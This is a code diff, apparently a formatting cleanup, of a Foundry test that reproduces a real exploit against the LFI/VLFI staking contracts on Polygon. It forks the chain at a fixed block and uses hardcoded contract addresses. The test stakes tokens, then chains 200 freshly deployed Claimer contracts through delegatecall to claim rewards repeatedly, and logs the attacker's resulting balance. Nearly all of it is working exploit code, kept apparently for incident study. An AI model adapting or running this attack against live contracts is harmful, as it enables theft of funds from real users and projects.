@@ -19,10 +19,11 @@ import "./interface.sol";
 // Twitter Guy : https://twitter.com/AnciliaInc/status/1660767088699666433
 // Hacking God : https://www.google.com/
 
-interface IVLFI is IERC20{
+interface IVLFI is IERC20 {
     function claimRewards(address to) external;
     function stake(address onBehalfOf, uint256 amount) external;
 }
+
 contract ContractTest is Test {
     IERC20 LFI = IERC20(0x77D97db5615dFE8a2D16b38EAa3f8f34524a0a74);
     IVLFI VLFI = IVLFI(0xfc604b6fD73a1bc60d31be111F798dd0D4137812);
@@ -31,7 +32,7 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("polygon", 43025776);
+        cheats.createSelectFork("polygon", 43_025_776);
         cheats.label(address(LFI), "LFI");
         cheats.label(address(VLFI), "VLFI");
     }
@@ -39,34 +40,32 @@ contract ContractTest is Test {
     function testExploit() external {
         deal(address(LFI), address(this), 86_000 * 1e18);
         claimer = new Claimer();
-        LFI.approve(address(VLFI), type(uint).max);
+        LFI.approve(address(VLFI), type(uint256).max);
         VLFI.stake(address(claimer), LFI.balanceOf(address(this)));
-        for(uint i; i < 200; i++){
+        for (uint256 i; i < 200; i++) {
             address newClaimer = claimer.delegate(VLFI.balanceOf(address(claimer)), address(this));
             claimer = Claimer(newClaimer);
         }
 
-
-        emit log_named_decimal_uint(
-            "Attacker LFI balance after exploit", LFI.balanceOf(address(this)), LFI.decimals()
-        );
+        emit log_named_decimal_uint("Attacker LFI balance after exploit", LFI.balanceOf(address(this)), LFI.decimals());
     }
 
-    function claimReward(uint256 VLFITransferAmount, address owner) external returns(address){
+    function claimReward(uint256 VLFITransferAmount, address owner) external returns (address) {
         VLFI.claimRewards(owner);
         claimer = new Claimer();
         VLFI.transfer(address(claimer), VLFITransferAmount);
         return address(claimer);
     }
-
 }
 
-contract Claimer is Test{
+contract Claimer is Test {
     IERC20 LFI = IERC20(0x77D97db5615dFE8a2D16b38EAa3f8f34524a0a74);
     IVLFI VLFI = IVLFI(0xfc604b6fD73a1bc60d31be111F798dd0D4137812);
     Claimer claimer;
-    function delegate(uint256 VLFITransferAmount, address owner) external returns(address){
-        (, bytes memory returnData) =  msg.sender.delegatecall(abi.encodeWithSignature("claimReward(uint256,address)", VLFITransferAmount, owner));
+
+    function delegate(uint256 VLFITransferAmount, address owner) external returns (address) {
+        (, bytes memory returnData) =
+            msg.sender.delegatecall(abi.encodeWithSignature("claimReward(uint256,address)", VLFITransferAmount, owner));
         return abi.decode(returnData, (address));
     }
 }
